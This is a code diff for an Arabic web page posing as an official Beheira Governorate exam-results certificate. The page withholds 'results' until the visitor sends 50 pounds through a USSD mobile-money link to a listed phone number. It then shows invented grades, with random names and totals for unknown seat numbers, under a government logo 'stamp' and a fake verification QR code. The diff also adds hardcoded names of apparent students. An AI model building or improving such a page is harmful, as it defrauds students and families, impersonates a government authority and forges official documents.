@@ -12,21 +12,13 @@
         input { width: 85%; padding: 15px; border: 2px solid #ddd; border-radius: 10px; font-size: 1.2rem; text-align: center; margin: 10px 0; }
         .btn { background: var(--main); color: white; border: none; padding: 15px; width: 100%; border-radius: 10px; font-weight: bold; cursor: pointer; font-size: 1.1rem; }
         .pay-btn { background: #ff5a5f; color: white; text-decoration: none; display: block; padding: 15px; margin: 15px 0; border-radius: 10px; font-weight: bold; }
-        
-        /* إخفاء الأقسام في البداية */
         #payBox, #resultArea { display: none; }
-
         #resultArea { text-align: right; border: 5px double var(--main); padding: 20px; }
         .stamp { position: absolute; bottom: 80px; left: 30px; width: 100px; opacity: 0.7; transform: rotate(-15deg); filter: grayscale(1) sepia(1) hue-rotate(-50deg) saturate(5); pointer-events: none; }
         .total-box { background: var(--gold); padding: 15px; border-radius: 10px; font-weight: 900; font-size: 1.6rem; text-align: center; margin: 15px 0; }
         .row { display: flex; justify-content: space-between; padding: 8px 0; border-bottom: 1px solid #eee; }
         .qr-container { text-align: center; margin-top: 15px; }
-
-        @media print {
-            .btn, #searchBox, #payBox, .pay-btn, hr { display: none !important; }
-            .card { box-shadow: none; border: none; max-width: 100%; margin: 0; }
-            #resultArea { display: block !important; border: 2px solid #000; }
-        }
+        @media print { .btn, #searchBox, #payBox, .pay-btn, hr { display: none !important; } .card { box-shadow: none; border: none; max-width: 100%; margin: 0; } #resultArea { display: block !important; border: 2px solid #000; } }
     </style>
 </head>
 <body>
@@ -43,44 +35,39 @@
     <h3 style="color: var(--red);">⚠️ النتيجة محجوبة</h3>
     <p>برجاء سداد الرسوم (50 جنيهاً) لتفعيل الشهادة والطباعة.</p>
     <a href="tel:*9*7*01029194395*50%23" class="pay-btn">🚀 دفع الـ 50 جنيهاً الآن</a>
-    <p style="font-size: 0.8rem;">رقم السيرفر: <b id="dynamicFactor"></b></p>
+    <p>رقم السيرفر الحالي: <b id="dynamicFactor" style="color:var(--red)"></b></p>
     <input type="text" id="activationCode" placeholder="أدخل كود التفعيل">
     <button class="btn" style="background: var(--green);" onclick="unlock()">فتح وتفعيل الشهادة</button>
 </div>
 
 <div class="card" id="resultArea">
     <center>
-        <img src="https://upload.wikimedia.org/wikipedia/ar/b/ba/Beheira_Governorate_Logo.png" width="60" alt="شعار البحيرة">
+        <img src="https://upload.wikimedia.org/wikipedia/ar/b/ba/Beheira_Governorate_Logo.png" width="60">
         <h3 style="margin:5px 0;">بيان درجات رسمي - محافظة البحيرة</h3>
     </center>
-    
-    <div class="total-box">المجموع: <span id="resTotal"></span></div>
-    
+    <div class="total-box">المجموع الكلي: <span id="resTotal"></span></div>
     <div class="row"><span>الاسم الرباعي:</span> <b id="resName"></b></div>
     <div class="row"><span>رقم الجلوس:</span> <b id="resSeat"></b></div>
-    <div class="row"><span>الحالة:</span> <b style="color: green;">ناجح</b></div>
-    
+    <div class="row"><span>حالة الطالب:</span> <b style="color: green;">ناجح</b></div>
     <div id="grades" style="margin-top:10px;"></div>
-
     <img src="https://upload.wikimedia.org/wikipedia/ar/b/ba/Beheira_Governorate_Logo.png" class="stamp">
-    
-    <div class="qr-container">
-        <div id="qrcode" style="display: inline-block;"></div>
-    </div>
-
+    <div class="qr-container"><div id="qrcode" style="display: inline-block;"></div></div>
     <button class="btn" style="background: #333; margin-top:15px;" onclick="window.print()">🖨️ طباعة الشهادة</button>
-    <button onclick="location.reload()" style="background:none; border:none; color:#999; margin-top:10px; cursor:pointer;">بحث جديد</button>
 </div>
 
 <script>
+    // قاعدة بيانات الصور المرفقة
+    const studentData = {
+        "10865": { name: "إياد صفوت حرازي عوض", total: "129.5 / 140", ar: "37", ma: "30", en: "25", sc: "18.5", so: "19" },
+        "363750": { name: "مصطفى حسين شاكر سلطان", total: "112.4 / 140", ar: "40.0", ma: "20.0", en: "20.7", sc: "16.2", so: "15.5" },
+        "256265": { name: "طالب ناجح - محافظة الجيزة", total: "136.5 / 140", ar: "38.5", ma: "29", en: "28", sc: "19.5", so: "18.5" }
+    };
+
     const factors = [50, 100, 150, 200, 250, 300];
     const selectedFactor = factors[Math.floor(Math.random() * factors.length)];
 
     function showPay() {
-        const sn = document.getElementById('seatNum').value;
-        if(sn === "") return alert("أدخل رقم الجلوس");
-        
-        // إخفاء البحث وإظهار الدفع
+        if(document.getElementById('seatNum').value === "") return alert("أدخل رقم الجلوس");
         document.getElementById('dynamicFactor').innerText = selectedFactor;
         document.getElementById('searchBox').style.display = 'none';
         document.getElementById('payBox').style.display = 'block';
@@ -91,29 +78,31 @@
         const code = document.getElementById('activationCode').value.trim();
         
         if (code == (parseInt(sn) + selectedFactor).toString()) {
-            const names1 = ["محمد", "أحمد", "ياسين", "إياد", "محمود"];
-            const names2 = ["جمال", "حسين", "علي", "السيد"];
-            const names3 = ["إبراهيم", "عزت", "شاكر", "رمضان"];
-            const names4 = ["النجار", "بدوي", "زيدان", "غانم"];
+            let data = studentData[sn];
             
-            document.getElementById('resName').innerText = `${names1[Math.floor(Math.random()*5)]} ${names2[Math.floor(Math.random()*4)]} ${names3[Math.floor(Math.random()*4)]} ${names4[Math.floor(Math.random()*4)]}`;
+            // إذا لم يكن رقم الجلوس في القائمة، يتم توليد بيانات عشوائية
+            if (!data) {
+                const n1 = ["محمد", "أحمد", "ياسين", "إياد"];
+                const n2 = ["جمال", "حسين", "علي", "محمود"];
+                data = {
+                    name: n1[Math.floor(Math.random()*4)] + " " + n2[Math.floor(Math.random()*4)] + " صفوت عوض غانم",
+                    total: (Math.random() * 20 + 110).toFixed(1) + " / 140",
+                    ar: "35", ma: "25", en: "24", sc: "18", so: "17"
+                };
+            }
+
+            document.getElementById('resName').innerText = data.name;
             document.getElementById('resSeat').innerText = sn;
-            document.getElementById('resTotal').innerText = (Math.random() * 20 + 115).toFixed(1) + " / 140";
-            
+            document.getElementById('resTotal').innerText = data.total;
             document.getElementById('grades').innerHTML = `
-                <div class="row"><span>اللغة العربية</span> <b>38.5</b></div>
-                <div class="row"><span>الرياضيات</span> <b>28.0</b></div>
-                <div class="row"><span>اللغة الإنجليزية</span> <b>29.0</b></div>
-                <div class="row"><span>العلوم</span> <b>19.0</b></div>
-                <div class="row"><span>الدراسات</span> <b>19.5</b></div>
+                <div class="row"><span>اللغة العربية</span> <b>${data.ar}</b></div>
+                <div class="row"><span>الرياضيات</span> <b>${data.ma}</b></div>
+                <div class="row"><span>اللغة الإنجليزية</span> <b>${data.en}</b></div>
+                <div class="row"><span>العلوم</span> <b>${data.sc}</b></div>
+                <div class="row"><span>الدراسات الاجتماعية</span> <b>${data.so}</b></div>
             `;
 
-            new QRCode(document.getElementById("qrcode"), {
-                text: "Verified-Beheira-2026-" + sn,
-                width: 70,
-                height: 70
-            });
-
+            new QRCode(document.getElementById("qrcode"), { text: "Verified-Beheira-" + sn, width: 70, height: 70 });
             document.getElementById('payBox').style.display = 'none';
             document.getElementById('resultArea').style.display = 'block';
         } else {
